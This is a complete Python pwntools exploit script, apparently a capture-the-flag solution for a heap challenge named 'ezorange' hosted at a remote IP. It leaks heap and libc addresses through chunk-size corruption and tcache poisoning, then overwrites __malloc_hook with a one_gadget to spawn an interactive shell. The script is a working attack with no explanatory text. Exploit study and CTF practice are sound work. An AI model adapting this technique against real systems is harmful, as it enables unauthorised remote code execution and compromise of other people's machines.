#!/usr/bin/python3

from pwn import *

def Buy(number, size):
	p.sendlineafter(b'> ', b'1')
	p.sendlineafter(b'number: ', str(number).encode())
	p.sendlineafter(b'Size: ', str(size).encode())

def Modify(number, index, value):
	p.sendlineafter(b'> ', b'2')
	p.sendlineafter(b'number: ', str(number).encode())
	p.sendlineafter(b'index: ', str(index).encode())
	p.recvuntil(b'Current value: ')
	data = p.recvuntil(b'\n', drop=True)
	p.sendlineafter(b'New value: ', str(value).encode())
	return data
    
libc = ELF('./libc.so.6', checksec=False)
exe = context.binary = ELF('./ezorange', checksec=False)
context.log_level = 'debug'
libc.sym['one_gadget'] = 0xceb71

p = remote('104.197.118.147', 10160)
# p = process(exe.path)

##################################
### Stage 1: Leak heap address ###
##################################
Buy(0, 0xa60)
payload = p64(0x301)
for i in range(len(payload[:3])):
	Modify(0, 0xa60 + 8 + i, payload[i])

Buy(1, 0x1000)

# Get & clear fw
heap_leak = []
for i in range(8):
	heap_leak.append(Modify(0, 0xa60+0x10 + i, 0))
heap_leak = u64(b''.join([p8(int(i)) for i in heap_leak]))
log.info("Heap leak: " + hex(heap_leak))
heap = heap_leak << 12
log.info("Heap base: " + hex(heap))

# Reset fw
payload = p64(heap_leak)
for i in range(8):
	Modify(0, 0xa60 + 0x10 + i, payload[i])

##################################
### Stage 2: Leak libc address ###
##################################
Buy(0, 0xce0)
payload = p64(0x301)
for i in range(len(payload[:3])):
	Modify(0, 0xce0 + 8 + i, payload[i])

Buy(0, 0x1000)
Buy(0, 0xce0)
payload = p64(0x301)
for i in range(len(payload[:3])):
	Modify(0, 0xce0 + 8 + i, payload[i])

Buy(1, 0x1000)
payload = p64(((heap + 0x44d10) >> 12) ^ exe.got['alarm'])
for i in range(len(payload)):
	Modify(0, 0xce0 + 0x10 + i, payload[i])

Buy(0, 0x2d0)
Buy(0, 0x2d0)

libc_leak = []
for i in range(8):
	libc_leak.append(Modify(0, i, 0))
libc_leak = u64(b''.join([p8(int(i)) for i in libc_leak]))
log.info("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym['alarm']
log.info("Libc base: " + hex(libc.address))

########################################################
### Stage 3: Overwrite __malloc_hook into one_gadget ###
########################################################
Buy(0, 0xce0)
payload = p64(0x301)
for i in range(len(payload[:3])):
	Modify(0, 0xce0 + 8 + i, payload[i])

Buy(1, 0x1000)
payload = p64(((heap + 0x66d10) >> 12) ^ libc.sym['__malloc_hook'])
for i in range(len(payload)):
	Modify(0, 0xce0 + 0x10 + i, payload[i])

Buy(0, 0x2d0)
Buy(0, 0x2d0)
payload = p64(libc.sym['one_gadget'])
for i in range(len(payload)):
	Modify(0, i, payload[i])

Buy(1, 0x1000)

p.interactive()
